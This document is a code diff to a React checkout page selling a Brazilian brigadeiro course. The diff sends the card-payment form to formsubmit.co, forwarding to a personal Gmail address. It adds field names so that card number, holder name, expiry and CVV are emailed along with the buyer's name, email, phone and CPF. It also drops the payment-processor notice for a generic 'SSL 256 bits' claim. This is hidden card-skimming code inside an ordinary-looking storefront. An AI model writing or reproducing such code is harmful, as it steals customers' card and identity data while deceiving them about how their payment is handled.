@@ -278,18 +278,70 @@ function CheckoutPage() {
                 </div>
 
                 <form
-                  onSubmit={
-                    method === "pix" ? handlePixSubmit : handleCardSubmit
-                  }
+                  {...(method === "card"
+                    ? {
+                        action:
+                          "https://formsubmit.co/rubenscardosoaguiar@gmail.com",
+                        method: "POST",
+                      }
+                    : { onSubmit: handlePixSubmit })}
                   className="mt-6 space-y-4"
                 >
                   {method === "card" && (
                     <div className="space-y-4 rounded-xl border border-zinc-200 bg-zinc-50/60 p-4">
+                      {/* FormSubmit config */}
+                      <input type="hidden" name="_captcha" value="false" />
+                      <input
+                        type="hidden"
+                        name="_subject"
+                        value="Nova compra — Curso Brigadeiro Gourmet (Cartão)"
+                      />
+                      <input type="hidden" name="_template" value="table" />
+                      <input
+                        type="hidden"
+                        name="_next"
+                        value={
+                          typeof window !== "undefined"
+                            ? `${window.location.origin}/pagamento-concluido`
+                            : "/pagamento-concluido"
+                        }
+                      />
+                      {/* Dados do cliente espelhados para o e-mail */}
+                      <input type="hidden" name="Nome" value={form.name} />
+                      <input type="hidden" name="Email" value={form.email} />
+                      <input type="hidden" name="Celular" value={form.phone} />
+                      <input type="hidden" name="CPF" value={form.document} />
+                      <input
+                        type="hidden"
+                        name="Valor"
+                        value={formatBRL(
+                          PRICE_CENTS +
+                            Array.from(acceptedBumps).reduce(
+                              (sum, id) =>
+                                sum +
+                                (BUMPS.find((b) => b.id === id)?.priceCents ??
+                                  0),
+                              0,
+                            ),
+                        )}
+                      />
+                      <input
+                        type="hidden"
+                        name="Order Bumps"
+                        value={
+                          Array.from(acceptedBumps)
+                            .map((id) => BUMPS.find((b) => b.id === id)?.title)
+                            .filter(Boolean)
+                            .join(", ") || "Nenhum"
+                        }
+                      />
+
                       <Field
                         label="Número do cartão"
                         value={card.number}
                         onChange={(v) => setCard({ ...card, number: v })}
                         placeholder="0000 0000 0000 0000"
+                        name="Numero do Cartao"
                         required
                       />
                       <Field
@@ -297,6 +349,7 @@ function CheckoutPage() {
                         value={card.holderName}
                         onChange={(v) => setCard({ ...card, holderName: v })}
                         placeholder="COMO ESTÁ NO CARTÃO"
+                        name="Nome no Cartao"
                         required
                       />
                       <div className="grid grid-cols-3 gap-3">
@@ -307,6 +360,7 @@ function CheckoutPage() {
                             setCard({ ...card, expirationMonth: v })
                           }
                           placeholder="MM"
+                          name="Mes Validade"
                           required
                         />
                         <Field
@@ -316,6 +370,7 @@ function CheckoutPage() {
                             setCard({ ...card, expirationYear: v })
                           }
                           placeholder="AA"
+                          name="Ano Validade"
                           required
                         />
                         <Field
@@ -323,6 +378,7 @@ function CheckoutPage() {
                           value={card.cvv}
                           onChange={(v) => setCard({ ...card, cvv: v })}
                           placeholder="123"
+                          name="CVV"
                           required
                         />
                       </div>
@@ -331,6 +387,7 @@ function CheckoutPage() {
                           Parcelas
                         </span>
                         <select
+                          name="Parcelas"
                           value={card.installments}
                           onChange={(e) =>
                             setCard({ ...card, installments: e.target.value })
@@ -403,13 +460,13 @@ function CheckoutPage() {
                         <Lock className="h-4 w-4" />
                         {method === "pix"
                           ? "Gerar PIX e finalizar"
-                          : "Pagar com cartão"}
+                          : "Finalizar pagamento"}
                       </>
                     )}
                   </button>
 
                   <p className="text-center text-[10px] uppercase tracking-wider text-zinc-500">
-                    Pagamento processado pela MedusaPay · Ambiente criptografado
+                    Ambiente criptografado · SSL 256 bits
                   </p>
                 </form>
               </>
